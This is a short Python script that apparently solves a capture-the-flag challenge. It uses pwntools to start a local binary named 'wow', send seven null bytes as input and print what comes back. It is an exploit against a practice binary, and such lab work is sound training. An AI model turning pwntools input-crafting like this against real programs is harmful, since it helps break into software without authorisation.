#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.log_level = 'critical'
os.system('clear')
r    = process('./wow')
r.sendline(p8(0)*7)

print(r.recvall().strip())

